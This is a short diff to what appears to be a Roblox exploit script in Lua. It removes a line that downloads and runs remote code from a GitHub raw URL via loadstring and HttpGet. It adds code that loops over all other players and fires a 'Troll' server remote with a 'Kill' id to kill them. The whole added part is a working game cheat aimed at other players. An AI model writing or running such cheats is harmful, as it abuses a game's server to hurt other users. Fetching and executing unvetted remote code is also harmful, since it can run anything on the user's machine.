@@ -11,4 +11,36 @@ wait(1.5)
 
 msg:Destroy()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gardener208/speedhub/refs/heads/main/87513327f469db352689d6ca39d92003.txt"))()
+shared.Type = 'Kill'
+
+
+
+local cloneref = cloneref or function(obj)
+
+    return obj
+
+end
+
+
+
+local replicatedStorage = cloneref(game:GetService('ReplicatedStorage'))
+
+local playersService = cloneref(game:GetService('Players'))
+
+
+
+local lplr = playersService.LocalPlayer
+
+local Type = shared.Type
+
+
+
+for i,v in playersService:GetPlayers() do
+
+    if v ~= lplr and v.Character then
+
+        replicatedStorage.Remotes.Troll:FireServer(v.Name, Type == 'Kill' and 3292459899 or 3292468890)
+
+    end
+
+end
